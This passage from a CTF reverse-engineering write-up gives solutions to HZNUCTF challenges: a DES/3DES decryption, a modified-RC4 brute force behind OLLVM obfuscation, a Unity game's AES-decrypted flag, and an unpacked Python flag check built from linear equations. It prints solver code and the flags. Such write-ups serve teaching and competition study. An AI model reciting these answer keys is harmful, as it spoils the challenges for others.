CipherContent,const int BlockCount)&#123;    des_ctx dc;    unsigned char  keyEn[8];    unsigned char  keyDe[8];        if((BlockCount == 0) || (Key == NULL) || (CipherContent == NULL) || (PlainContent == NULL))    &#123;        return -1;    &#125;    if((KeyLen != 8) &amp;&amp; (KeyLen != 16))    &#123;        return -1;    &#125;    memcpy(CipherContent, PlainContent,BlockCount*8);       switch (KeyLen)    &#123;    case 8:    // DES        memcpy(keyEn,Key,8);               //keyEn        des_key(&amp;dc, keyEn);        des_enc(&amp;dc, CipherContent, BlockCount);        break;    case 16:    // 3DES        memcpy(keyEn,Key,8);               //keyEn        memcpy(keyDe, Key+8, 8);      //keyDe        des_key(&amp;dc, keyEn);        des_enc(&amp;dc, CipherContent, BlockCount);                des_key(&amp;dc, keyDe);        des_dec(&amp;dc, CipherContent, BlockCount);        des_key(&amp;dc, keyEn);        des_enc(&amp;dc, CipherContent, BlockCount);        break;        default:            return -1;              &#125;    return 0;   &#125;int des_decrypt(const unsigned char* Key,const unsigned char KeyLen,const unsigned char* CipherContent,unsigned char* PlainContent,const int BlockCount)&#123;    des_ctx dc;    unsigned char keyEn[8];    unsigned char keyDe[8];        if((BlockCount == 0) || (Key == NULL) || (CipherContent == NULL) || (PlainContent == NULL))    &#123;        return -1;    &#125;    if((KeyLen != 8) &amp;&amp; (KeyLen != 16))    &#123;        return -1;    &#125;    memcpy(PlainContent,CipherContent,BlockCount*8);            switch (KeyLen)    &#123;    case 8:    // DES        memcpy(keyEn,Key,8);               //keyEn        des_key(&amp;dc, keyEn);        des_dec(&amp;dc, PlainContent, BlockCount);        break;    case 16:        memcpy(keyEn,Key,8);               //keyEn        memcpy(keyDe, Key+8, 8);        //keyDe        des_key(&amp;dc, keyEn);        des_dec(&amp;dc, PlainContent, BlockCount);        des_key(&amp;dc, keyDe);        des_enc(&amp;dc, PlainContent, BlockCount);        des_key(&amp;dc, keyEn);        des_dec(&amp;dc, PlainContent, BlockCount);                     break;    default:        return -1;              &#125;    return 0;&#125;int main()&#123;    unsigned char i;    unsigned char plain[64];    unsigned char cipher[64];     unsigned char key[16] = &#123;0x48, 0x5a, 0x4e, 0x55, 0x43, 0x54, 0x46, 0x7b&#125;;    unsigned char data[64];    char string[] = &quot;333936147332632923d96353321d3345636826d26314621d3349330463126348&quot;;    for (int i = 0; i &lt; 64; i++) &#123;        data[i] = string[i];    &#125;    memcpy((void*)plain, data, 64);    des_encrypt(key, 8, plain, cipher,8);              if(des_decrypt(key, 8, cipher, plain, 8) == 0x0) &#123;        printf(&quot;sc_des plain data: \n&quot;);        for(i = 0; i &lt; 64; i++) &#123;            printf(&quot;%c&quot;,plain[i]);        &#125;        printf((&quot;\n&quot;));           &#125;    else &#123;        printf(&quot;sc_des failed \n&quot;);    &#125;    return 0;&#125;</code></pre><p>拿到DES加密之前的数据</p><p><strong>333936147332632923d96353321d3345636826d26314621d3349330463126348</strong></p><p>再写个脚本每四位的中间两位交换一下位置，就可以拿到flag了</p><pre><code class="language-python">enc = &quot;333936147332632923d96353321d3345636826d26314621d3349330463126348&quot;enc_list = list(enc)# 交换字符for i in range(1, len(enc_list), 4):    if i + 1 &lt; len(enc_list):        enc_list[i], enc_list[i + 1] = enc_list[i + 1], enc_list[i]processed_str = &quot;&quot;.join(enc_list)print(&quot;HZNUCTF&#123;&quot;, end=&quot;&quot;)# 每两位转成字符并输出for i in range(0, len(processed_str), 2):    hex_str = processed_str[i:i+2]    print(chr(int(hex_str, 16)), end=&quot;&quot;)print(&quot;&#125;&quot;)</code></pre><p><strong>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</strong></p><p>后记：有的师傅非预期了，预期解如上，但是我在出题的时候源码中忘记删掉3DES的代码了，导致可以直接patch调用3DES中的解密函数，直接解密了…</p><hr><h3 id="conforand"><a href="#conforand" class="headerlink" title="conforand"></a>conforand</h3><p>考点总结：ollvm混淆，魔改RC4，伪随机数爆破</p><p>题目描述：简直辣眼睛… flag格式为HZNUCTF{}</p><p>WP：</p><p>ida打开，混淆非常严重，但是函数名都没做任何混淆，可以用插件D-810进行一定程度的去混淆</p><p>下面是去混淆后函数部分截图，同时根据逻辑对函数名和变量名进行了重命名</p><p>main函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213125821396.png" alt="image-20250213125821396"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130010978.png" alt="image-20250213130010978"></p><p>init函数，sub_5s5s5s函数，这两个函数就是对rc4的密钥进行初始化以及伪随机初始化</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213125900403.png" alt="image-20250213125900403"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213125916874.png" alt="image-20250213125916874"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213125925981.png" alt="image-20250213125925981"></p><p>rc4函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130057732.png" alt="image-20250213130057732"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130126684.png" alt="image-20250213130126684"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130134256.png" alt="image-20250213130134256"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130142272.png" alt="image-20250213130142272"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130149747.png" alt="image-20250213130149747"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130158890.png" alt="image-20250213130158890"></p><p>init_sbox函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130251422.png" alt="image-20250213130251422"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130312758.png" alt="image-20250213130312758"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130319813.png" alt="image-20250213130319813"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130333765.png" alt="image-20250213130333765"></p><p>rc4魔改了三个地方，一个是sbox初始化时，密钥形成密钥流的时候异或了伪随机生成的一个数，然后在rc4加密函数中的swap改成了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250213130447399.png" alt="image-20250213130447399"></p><p>以及加密的轮数是257</p><p>那么就可以写解密爆破脚本了，根据附件中的output.txt</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;  #include &lt;string.h&gt;int init(unsigned char* s, char* key, unsigned long Len_k)&#123;    int i = 0, j = 0;unsigned k[258] = &#123; 0 &#125;;unsigned char tmp = 0;for (i = 0; i &lt; 257; i++) &#123;s[i] = i;k[i] = key[i % Len_k];&#125;for (i = 0; i &lt; 257; i++) &#123;j = (j + s[i] + k[i]) % 257;tmp = s[i];s[i] = s[j];s[j] = tmp;&#125;return 0; &#125;int rc4(unsigned char* Data, unsigned long Len_D, char* key, unsigned long Len_k) &#123;unsigned char s[258];init(s, key, Len_k);int i = 0, j = 0, t = 0;unsigned long k = 0;unsigned char tmp;for (k = 0; k &lt; Len_D; k++) &#123;i = (i + 1) % 257;j = (j + s[i]) % 257;s[i] = s[j];s[j] = s[i];t = (s[i] + s[j]) % 257;Data[k] = Data[k] ^ s[t];&#125;return 0; &#125;int main() &#123;    char key[] = &quot;JustDoIt!&quot;;    for (int rand_num = 0; rand_num &lt;= 365; rand_num++) &#123;        unsigned char qw[] = &#123;0x83, 0x1e, 0x9c, 0x48, 0x7a, 0xfa, 0xe8, 0x88, 0x36, 0xd5,                               0x0a, 0x08, 0xf6, 0xa7, 0x70, 0x0f, 0xfd, 0x67, 0xdd, 0xd4,                               0x3c, 0xa7, 0xed, 0x8d, 0x51, 0x10, 0xce, 0x6a, 0x9e, 0x56,                               0x57, 0x83, 0x56, 0xe7, 0x67, 0x9a, 0x67, 0x22, 0x24, 0x6e,                               0xcd, 0x2f&#125;;        strcpy(key, &quot;JustDoIt!&quot;);        for (int j = 0; j &lt; 9; j++) &#123;            key[j] ^= rand_num;        &#125;        unsigned long key_len = sizeof(key) - 1;        rc4(qw, sizeof(qw), key, key_len);        if (qw[0] == &#39;H&#39; &amp;&amp; qw[1] == &#39;Z&#39; &amp;&amp; qw[2] == &#39;N&#39; &amp;&amp; qw[3] == &#39;U&#39;) &#123;            for (int ii = 0; ii &lt; 42; ii++) &#123;                printf(&quot;%c&quot;, qw[ii]);            &#125;            printf(&quot;\nrand_num: %d&quot;, rand_num);            return 0;        &#125;    &#125;    return 0;&#125;</code></pre><p><strong>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</strong><br>rand_num: 56</p><hr><h3 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h3><p>考点总结：unity游戏逆向，AES加密</p><p>题目描述：Just for fun…(貌似有些bug？但好像不影响…) flag格式为HZNUCTF{}</p><p>WP：</p><p>签到题，找到Assembly-CSharp.dll，然后用dnSpy打开，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250226102346685.png" alt="image-20250226102346685"></p><p>找到GameManger这个类，可以看到代码没有任何混淆，分析下逻辑，就是切水果分数达到999999999就会弹flag，flag是由程序中设定好的密文经AES CBC模式进行解密得到的。key和iv都可以直接获取</p><pre><code class="language-c#">// Token: 0x0600001C RID: 28 RVA: 0x00002474 File Offset: 0x00000674public void IncreaseScore(int points)&#123;this.score += points;this.scoreText.text = this.score.ToString();if (this.score &gt;= 999999999)&#123;byte[] cipherText = this.ConvertHexStringToByteArray(GameManager.encryptedHexData);string text = this.Decrypt(cipherText, GameManager.encryptionKey, GameManager.iv);if (this.decryptedTextDisplay != null)&#123;this.decryptedTextDisplay.text = text;&#125;&#125;else if (this.decryptedTextDisplay != null)&#123;this.decryptedTextDisplay.text = &quot;&quot;;&#125;float num = PlayerPrefs.GetFloat(&quot;hiscore&quot;, 0f);if ((float)this.score &gt; num)&#123;num = (float)this.score;PlayerPrefs.SetFloat(&quot;hiscore&quot;, num);&#125;&#125;</code></pre><pre><code class="language-c#">// Token: 0x0600001E RID: 30 RVA: 0x0000257C File Offset: 0x0000077Cprivate string Decrypt(byte[] cipherText, string key, string iv)&#123;string result;using (Aes aes = Aes.Create())&#123;aes.Key = Encoding.UTF8.GetBytes(key);aes.IV = Encoding.UTF8.GetBytes(iv);aes.Mode = CipherMode.CBC;aes.Padding = PaddingMode.PKCS7;ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);using (MemoryStream memoryStream = new MemoryStream(cipherText))&#123;using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))&#123;using (StreamReader streamReader = new StreamReader(cryptoStream))&#123;result = streamReader.ReadToEnd();&#125;&#125;&#125;&#125;return result;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250226102715355.png" alt="image-20250226102715355"></p><p>赛博厨子一把梭</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250226102816918.png" alt="image-20250226102816918"></p><p><strong>HZNUCTF{de20-70dd-4e62-b8d0-06e}</strong></p><hr><h3 id="蛇年的本命语言"><a href="#蛇年的本命语言" class="headerlink" title="蛇年的本命语言"></a>蛇年的本命语言</h3><p>考点总结：python逆向，z3，自定义加密，变量名混淆</p><p>题目描述：如题…flag的格式为HZNUCTF{}</p><p>WP：</p><p>附件是个python的exe，运行的时候可能会提示缺少python38.dll，在同级目录放一个就好了</p><p>用pyinstxtractor解包，然后找到output.pyc，直接用uncompyle6反编译，得到伪代码</p><pre><code class="language-python"># uncompyle6 version 3.9.2# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]# Embedded file name: output.pyfrom collections import Counterprint(&quot;Welcome to HZNUCTF!!!&quot;)print(&quot;Plz input the flag:&quot;)ooo0oOoooOOO0 = input()oOO0OoOoo000 = Counter(ooo0oOoooOOO0)O0o00 = &quot;&quot;.join((str(oOO0OoOoo000[oOooo0OOO]) for oOooo0OOO in ))print(&quot;ans1: &quot;, end=&quot;&quot;)print(O0o00)if O0o00 != &quot;111111116257645365477364777645752361&quot;:    print(&quot;wrong_wrong!!!&quot;)    exit(1)iiIII = &quot;&quot;for oOooo0OOO in ooo0oOoooOOO0:    if oOO0OoOoo000[oOooo0OOO] &gt; 0:        iiIII += oOooo0OOO + str(oOO0OoOoo000[oOooo0OOO])        oOO0OoOoo000[oOooo0OOO] = 0    else:        i11i1Iii1I1 = [ord(oOooo0OOO) for oOooo0OOO in iiIII]        ii1iIi1i11i = [         7 * i11i1Iii1I1[0] == 504,         9 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] == 403,         2 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] == 799,         3 * i11i1Iii1I1[0] + 8 * i11i1Iii1I1[1] + 15 * i11i1Iii1I1[2] + 20 * i11i1Iii1I1[3] == 2938,         5 * i11i1Iii1I1[0] + 15 * i11i1Iii1I1[1] + 20 * i11i1Iii1I1[2] - 19 * i11i1Iii1I1[3] + 1 * i11i1Iii1I1[4] == 2042,         7 * i11i1Iii1I1[0] + 1 * i11i1Iii1I1[1] + 9 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 2 * i11i1Iii1I1[4] + 5 * i11i1Iii1I1[5] == 1225,         11 * i11i1Iii1I1[0] + 22 * i11i1Iii1I1[1] + 33 * i11i1Iii1I1[2] + 44 * i11i1Iii1I1[3] + 55 * i11i1Iii1I1[4] + 66 * i11i1Iii1I1[5] - 77 * i11i1Iii1I1[6] == 7975,         21 * i11i1Iii1I1[0] + 23 * i11i1Iii1I1[1] + 3 * i11i1Iii1I1[2] + 24 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] - 7 * i11i1Iii1I1[6] + 15 * i11i1Iii1I1[7] == 229,         2 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 13 * i11i1Iii1I1[2] + 0 * i11i1Iii1I1[3] - 65 * i11i1Iii1I1[4] + 15 * i11i1Iii1I1[5] + 29 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] + 20 * i11i1Iii1I1[8] == 2107,         10 * i11i1Iii1I1[0] + 7 * i11i1Iii1I1[1] + -9 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] + 22 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] - 22 * i11i1Iii1I1[8] + 30 * i11i1Iii1I1[9] == 4037,         15 * i11i1Iii1I1[0] + 59 * i11i1Iii1I1[1] + 56 * i11i1Iii1I1[2] + 66 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] - 122 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 3 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] == 4950,         13 * i11i1Iii1I1[0] + 66 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 39 * i11i1Iii1I1[3] - 33 * i11i1Iii1I1[4] + 13 * i11i1Iii1I1[5] - 2 * i11i1Iii1I1[6] + 42 * i11i1Iii1I1[7] + 62 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] == 12544,         23 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 3 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 63 * i11i1Iii1I1[5] - 25 * i11i1Iii1I1[6] + 2 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] == 6585,         223 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] - 29 * i11i1Iii1I1[2] - 53 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 3 * i11i1Iii1I1[5] - 65 * i11i1Iii1I1[6] + 0 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 15 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 13 * i11i1Iii1I1[13] == 6893,         29 * i11i1Iii1I1[0] + 13 * i11i1Iii1I1[1] - 9 * i11i1Iii1I1[2] - 93 * i11i1Iii1I1[3] + 33 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] + 65 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] - 36 * i11i1Iii1I1[8] + 0 * i11i1Iii1I1[9] - 16 * i11i1Iii1I1[10] + 96 * i11i1Iii1I1[11] - 68 * i11i1Iii1I1[12] + 33 * i11i1Iii1I1[13] - 14 * i11i1Iii1I1[14] == 1883,         69 * i11i1Iii1I1[0] + 77 * i11i1Iii1I1[1] - 93 * i11i1Iii1I1[2] - 12 * i11i1Iii1I1[3] + 0 * i11i1Iii1I1[4] + 0 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 16 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 6 * i11i1Iii1I1[9] + 19 * i11i1Iii1I1[10] + 66 * i11i1Iii1I1[11] - 8 * i11i1Iii1I1[12] + 38 * i11i1Iii1I1[13] - 16 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] == 8257,         23 * i11i1Iii1I1[0] + 2 * i11i1Iii1I1[1] - 3 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 12 * i11i1Iii1I1[4] + 24 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] + 14 * i11i1Iii1I1[8] - 0 * i11i1Iii1I1[9] + 1 * i11i1Iii1I1[10] + 68 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 68 * i11i1Iii1I1[13] - 26 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] - 16 * i11i1Iii1I1[16] == 5847,         24 * i11i1Iii1I1[0] + 0 * i11i1Iii1I1[1] - 1 * i11i1Iii1I1[2] - 15 * i11i1Iii1I1[3] + 13 * i11i1Iii1I1[4] + 4 * i11i1Iii1I1[5] + 16 * i11i1Iii1I1[6] + 67 * i11i1Iii1I1[7] + 146 * i11i1Iii1I1[8] - 50 * i11i1Iii1I1[9] + 16 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 27 * i11i1Iii1I1[14] + 45 * i11i1Iii1I1[15] - 6 * i11i1Iii1I1[16] + 17 * i11i1Iii1I1[17] == 18257,         25 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] - 89 * i11i1Iii1I1[2] + 16 * i11i1Iii1I1[3] + 19 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 150 * i11i1Iii1I1[8] - 250 * i11i1Iii1I1[9] + 166 * i11i1Iii1I1[10] + 126 * i11i1Iii1I1[11] - 11 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 207 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] == 12591,         5 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 8 * i11i1Iii1I1[2] + 160 * i11i1Iii1I1[3] + 9 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 15 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 66 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] + 19 * i11i1Iii1I1[19] == 52041,         29 * i11i1Iii1I1[0] - 26 * i11i1Iii1I1[1] + 0 * i11i1Iii1I1[2] + 60 * i11i1Iii1I1[3] + 90 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 6 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 16 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 69 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] - 46 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] - 1 * i11i1Iii1I1[18] + 39 * i11i1Iii1I1[19] - 20 * i11i1Iii1I1[20] == 20253,         45 * i11i1Iii1I1[0] - 56 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] + 650 * i11i1Iii1I1[3] - 900 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 6 * i11i1Iii1I1[7] - 6 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 2 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 651 * i11i1Iii1I1[16] + 2 * i11i1Iii1I1[17] - 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] - 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] == 18768,         555 * i11i1Iii1I1[0] - 6666 * i11i1Iii1I1[1] + 70 * i11i1Iii1I1[2] + 510 * i11i1Iii1I1[3] - 90 * i11i1Iii1I1[4] + 499 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 66 * i11i1Iii1I1[7] - 610 * i11i1Iii1I1[8] - 221 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 23 * i11i1Iii1I1[11] - 102 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 2050 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 665 * i11i1Iii1I1[16] + 333 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 22 * i11i1Iii1I1[22] == 111844,         1 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4444 * i11i1Iii1I1[3] - 5555 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] - 666 * i11i1Iii1I1[6] + 676 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 22 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 73 * i11i1Iii1I1[11] - 107 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] - 6 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 39 * i11i1Iii1I1[17] + 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] == 159029,         520 * i11i1Iii1I1[0] - 222 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56655 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 73 * i11i1Iii1I1[11] + 1007 * i11i1Iii1I1[12] + 7777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 99999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] == 2762025,         1323 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 9999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] == 1551621,         777 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 999 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] == 948348,         97 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] + 96 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] == 777044,         177 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 699 * i11i1Iii1I1[2] + 64 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] - 96 * i11i1Iii1I1[5] - 66 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 28 * i11i1Iii1I1[28] == 185016,         77 * i11i1Iii1I1[0] - 2 * i11i1Iii1I1[1] + 6 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] - 96 * i11i1Iii1I1[4] - 9 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 0 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 9 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 26 * i11i1Iii1I1[25] - -58 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 2 * 